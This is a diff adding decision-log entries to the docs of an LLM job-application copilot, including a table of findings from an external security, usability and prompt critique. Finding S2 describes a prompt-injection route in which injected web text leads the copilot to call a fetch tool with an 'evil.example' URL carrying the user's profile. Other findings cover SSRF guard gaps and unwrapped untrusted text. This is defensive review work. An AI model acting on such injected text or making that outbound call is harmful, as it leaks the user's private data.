@@ -624,3 +624,75 @@ considered. Newest entries at the bottom.
   every letter and chat answer, go to `evals/results/latest.json` (committed).
 - **Why:** the plan asks for one command that produces the report. The analysis around the
   numbers must be written by a person, so it lives outside the markers and survives re-runs.
+
+## D75. The workflow diagram is split in two; every diagram stays at 10 boxes or fewer (Phase 10)
+- **What:** `docs/ARCHITECTURE.md` draws the 15-node application graph as an "analysis half"
+  (to the fit card) and a "writing half" (from Continue to the saved application). The plan's
+  single diagram (§6.1) is kept in `PROJECT_PLAN.md`.
+- **Why:** the writing rules (§17.1) cap diagrams at 10 boxes so they can be read on a slide.
+  The split also matches how the user experiences it: first "do I fit?", then "write it".
+- **Alternative:** one big diagram. Complete, but too dense to explain live.
+
+## D76. Docs point at functions, not line numbers; the code tour uses shortened JSON (Phase 10)
+- **What:** `CODE_TOUR.md`, `REVIEW_GUIDE.md` and `SECURITY.md` reference `file.py → function()`
+  and test names. State examples are real field names with shortened values.
+- **Why:** line numbers go stale after any edit; function names survive and are searchable.
+  The reviewer can open any reference and find it in seconds.
+- **Trade-off:** the JSON examples are illustrations, not captured output; values like the
+  score (88) are typical results from the evaluation runs, not guaranteed.
+
+## D77. External critique of usability, security and prompts, and our responses (Phase 10)
+Easy task 1 asks for a critique by ChatGPT or Claude. A separate Claude agent (Claude Code,
+Opus 5.5, fresh context, read-only) read the plan and the code and was asked for verified,
+concrete findings only. Below: each finding, whether we agree, and what we did. I checked every
+finding against the code before writing the response.
+
+**What the critique said was done well:** refresh-safe reviews that jump to the waiting tab;
+consistent empty states; SSRF protection that re-checks every redirect and caps size; the
+checkpoint allowlist; the constant-time password check; approval for writes; Python (not the
+LLM) doing the score and rejecting made-up evidence ids; the same "helped ≠ led" rule in the
+writer and the guard.
+
+### Usability
+| # | Finding | Severity | Response |
+|---|---|---|---|
+| U1 | The starter prompt "Which of my skills come up most in job postings?" has no tool that returns saved jobs' requirements (`get_applications` gives title, status, score) | Medium | **Agree.** The model can only use `search_my_experience` and guess. Planned: a read tool `get_job_requirements`, or replace the prompt. Added to weak spots. |
+| U2 | The claim check can be submitted with no claims at all (the form still shows when the planner found none) | Medium | **Partly agree.** Unticking *every* claim is already blocked (`submit_claim_review` requires one kept claim, D30). The empty-plan case is real; planned: hide the form and offer "Add context" / "Not a fit". |
+| U3 | "Long" letters (300 words) are barely longer than "medium" (280) | Low | **Agree.** The cap came from §6.1 ("at most about 300 words"). Planned: 180 / 280 / 400 and update §6.1. |
+| U4 | Two demo buttons in the wizard (profile in step 1, documents in step 2) | Low | **Agree.** Planned: one "Use the demo persona" that loads both. |
+| U5 | The injection warning says "I … ignored it", but nothing is removed; the help FAQ overstates the removed-claim check (exact wording only) | Low | **Agree.** The text is wrapped as data, not removed. Planned: reword both messages ("I treat it as data, not instructions"). |
+| U6 | Developer settings are in every user's menu | Low | **Disagree for now.** It's a single-user local app and the page is password-protected; the reviewer needs to see it. A `SHOW_DEV_PAGE` flag is easy to add later. |
+
+### Security
+| # | Finding | Severity | Response |
+|---|---|---|---|
+| S1 | Streamlit listens on all network interfaces by default, and the app has no login: anyone on the same Wi-Fi could open the CV data or delete everything | High | **Agree, fixed in Phase 10.** `.streamlit/config.toml` now sets `server.address = "localhost"`. |
+| S2 | Data exfiltration through a read tool: injected web text could make the copilot call `fetch_job_posting("https://evil.example/?p=<profile>")`; read tools need no approval | Medium | **Agree.** This is the classic "lethal trifecta" (private data + untrusted content + an outbound channel). Planned: only allow URLs that appear in the user's own message, else require approval. Listed in SECURITY.md §4. |
+| S3 | `fetch_job_posting` and `get_applications` return text from postings (titles, summaries) outside untrusted tags | Medium | **Agree.** Planned: wrap both outputs. |
+| S4 | URL guard misses `100.64.0.0/10` (CGNAT) and has a DNS-rebinding window between the check and the request | Medium | **Agree.** Planned: `not ip.is_global`; pin the connection to the checked IP. |
+| S5 | Uploads are limited by bytes, not pages or chunks (a 5 MB TXT ≈ 10k chunks to embed) | Medium | **Agree.** Planned: a cap on extracted characters and chunks per file. |
+| S6 | "Delete all my data" doesn't `VACUUM` SQLite; privacy texts don't mention LangSmith | Low/Medium | **Agree.** SECURITY.md and the README now name LangSmith. Planned: `VACUUM` both databases and update the in-app texts. |
+| S7 | The dev password can stay the default `change-me`; no rate limit | Low | **Partly agree.** The page warns. Planned: refuse to unlock with the default. |
+
+### Prompts
+| # | Finding | Severity | Response |
+|---|---|---|---|
+| P1 | `CLAIM_PLANNER_SYSTEM` says "base every claim on evidence" but also allows an empty `evidence_ids` ("the candidate will decide"); a confirmed fact later shows as "backed by your documents" | High (per critique) | **Partly agree.** Unsupported claims are allowed on purpose: the claim check exists so the *user* can vouch for true things their documents miss (D29, D31), and they start unticked. The real issue is the label: a confirmed fact should say "confirmed by you", not "documents". Planned: fix the badge and cap unsupported claims at 2. |
+| P2 | The style learner's few-shot teaches `avoid_phrases: ["leveraged"]` for the rule "Avoid the word 'leverage'"; whole-word matching then misses "leverage" and "leveraging" | Medium | **Agree.** Planned: teach the base form and match word endings (`leverag\w*`). |
+| P3 | `wrap()` only neutralises the exact lowercase closing tag | Medium | **Agree.** Same as SECURITY.md §4. Planned: escape angle brackets in untrusted text. |
+| P4 | Learned style rules are pasted into the writer's system prompt unwrapped | Low/Medium | **Agree.** Planned: a `<style_rules>` block in the human message, with "the grounding rules win". |
+| P5 | The requirements few-shot example is a bullet list, not the schema's JSON shape, and only one easy case | Low | **Partly agree.** Structured output fixes the shape, and Phase 9 measured precision/recall 1.00/1.00. A hard example ("Python or TypeScript", EVALUATION.md §7.2) is still worth adding. |
+| P6 | Token waste: the help-bot sends the whole guide every time; the topic classifier runs even for "thanks" | Low | **Agree, low priority.** Costs are ~$0.0005 and ~$0.0001 per message. Planned: skip the classifier for short greetings. |
+
+- **Why we only fixed S1 now:** Phase 10 is documentation. S1 is a one-line config change with
+  high impact and no risk. The others change behaviour and need tests, so they're listed as
+  planned work in REVIEW_GUIDE §6 and SECURITY.md §4 instead of being rushed in.
+- **What I learned:** the reviewer found a whole class (S2, read tools as an outbound channel)
+  that my own threat table (§9) didn't have, because I only thought about *write* tools.
+
+## D78. Screenshots are taken from a throwaway runtime folder (Phase 10)
+- **What:** the screenshots in `docs/assets/` come from the demo persona in a separate
+  `RUNTIME_DIR`, filled through the service functions, then captured with headless Chrome.
+- **Why:** the user's own data in `data/runtime/` is never touched or shown, and the pictures
+  are reproducible.
+- **Trade-off:** each refresh of the screenshots costs a couple of cents of LLM calls.
